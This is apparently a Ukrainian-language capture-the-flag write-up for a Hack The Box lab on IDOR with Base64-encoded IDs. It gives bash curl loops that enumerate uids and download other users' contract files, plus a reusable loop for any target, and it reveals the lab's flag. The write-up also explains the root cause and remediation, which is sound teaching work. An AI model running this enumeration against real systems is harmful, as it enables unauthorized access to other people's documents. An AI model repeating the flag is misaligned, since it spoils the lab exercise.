# Web Attacks — IDOR: Bypassing Encoded References (Base64 IDs)

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [IDOR - Bypassing Encoded References](https://academy.hackthebox.com/app/module/134/section/1187)
Ціль: 154.57.164.70:31879
Відповідь: `HTB{h45h1n6_1d5_w0n7_570p_m3}`

## Концепція

Розробник знову зробив IDOR (той самий послідовний `uid`), але цього разу спробував "захиститись" через **обфускацію**, а не через реальну авторизацію: значення `uid` перед відправкою кодується клієнтською JS-функцією `btoa(uid)` (Base64) і передається як параметр `contract`.

Це класична помилка "security through obscurity" — кодування не є шифруванням і не є контролем доступу. Base64 — це **зворотне, детерміноване перетворення без секретного ключа**: `1 → MQ==`, `2 → Mg==`, `20 → MjA=`. Оскільки алгоритм кодування публічно видимий у JS-коді сторінки (`atob`/`btoa`), ми можемо на своєму боці згенерувати ті самі закодовані значення для будь-якого uid і просто перебрати їх — сервер декодує Base64 назад у число і повертає файл, знову без жодної перевірки прав доступу.

## Крок 1 — Знаходимо механізм кодування в JS

```bash
curl -s "http://154.57.164.70:31879/contracts.php" | grep -A5 -B5 "downloadContract"
```

У відповіді бачимо JS-функцію:
```javascript
function downloadContract(uid) {
  window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
}
```
Це відкриває нам весь алгоритм: сирий `uid` просто проганяється через `btoa()` (стандартний Base64 encode) і кладеться в параметр `contract`. Жодного секрету, солі чи хешування — лише кодування.

## Крок 2 — Перевіряємо гіпотезу вручну на uid=1

```bash
echo -n "1" | base64
# MQ==
curl -s "http://154.57.164.70:31879/download.php?contract=MQ%3D%3D" -o contract_1.pdf
file contract_1.pdf
```

Файл прийшов порожній — це нормально: `uid=1` існує, але для нього немає файлу з флагом (не всі uid мають однаковий тип документа). Головне — запит не був відхилений, тобто підхід з відтворенням Base64 працює технічно правильно.

## Крок 3 — Масовий перебір uid 1–20 з кодуванням "на льоту"

```bash
url="http://154.57.164.70:31879"

for i in {1..20}; do
  encoded=$(echo -n "$i" | base64)
  curl -s -G "$url/download.php" --data-urlencode "contract=$encoded" -o "contract_$i.pdf"
  echo "uid=$i -> $(file -b contract_$i.pdf)"
done
```

Пояснення логіки:
- `echo -n "$i" | base64` — на кожній ітерації кодуємо поточне число в Base64, точно повторюючи клієнтську функцію `btoa()`.
- `curl -G --data-urlencode "contract=$encoded"` — коректно URL-енкодимо Base64-рядок (він містить `=`, що є спецсимволом в URL) і передаємо як GET-параметр.
- `file -b contract_$i.pdf` — визначає реальний тип завантаженого файлу за magic bytes, а не за розширенням, що дозволяє відрізнити справжній PDF від текстового файлу з флагом.

Результат: `uid=20 -> ASCII text` — єдиний файл, який не є справжнім PDF, а текстовим документом.

## Крок 4 — Читаємо флаг

```bash
cat contract_20.pdf
```

Результат:
```
HTB{h45h1n6_1d5_w0n7_570p_m3}
```

## Чому це працює (root cause для звіту)

- **Опис:** Ендпоінт `/download.php` використовує Base64-кодування параметра `contract` як єдиний "захисний" механізм замість реальної перевірки авторизації.
- **Технічні деталі:** Клієнтський JS відкрито показує алгоритм (`btoa(uid)`), Base64 — це кодування без ключа, тому будь-який атакуючий може відтворити валідні значення параметра для довільного uid і отримати файли інших користувачів.
- **Ризик/Імпакт:** IDOR з обходом "обфускаційного" захисту (Broken Access Control, OWASP A01) — конфіденційні документи (трудові контракти) усіх співробітників доступні неавторизованим користувачам через тривіальний перебір і локальне кодування.
- **Рекомендації:** Ніколи не покладатись на кодування (Base64/hex/URL-encode) як на контроль доступу — це лише представлення даних, не захист; впровадити серверну перевірку прав доступу до конкретного `contract`/`uid` відносно сесії користувача; за потреби використовувати непередбачувані, підписані токени (наприклад, HMAC-підписаний ID або короткоживучий signed URL) замість прямого посилання на об'єкт.

## Швидкий payload на майбутнє

```bash
url="http://TARGET:PORT"
for i in $(seq 1 100); do
  encoded=$(echo -n "$i" | base64)
  curl -s -G "$url/download.php" --data-urlencode "contract=$encoded" -o "out_$i.pdf"
  echo "$i -> $(file -b out_$i.pdf)"
done | grep -v "PDF document"
```
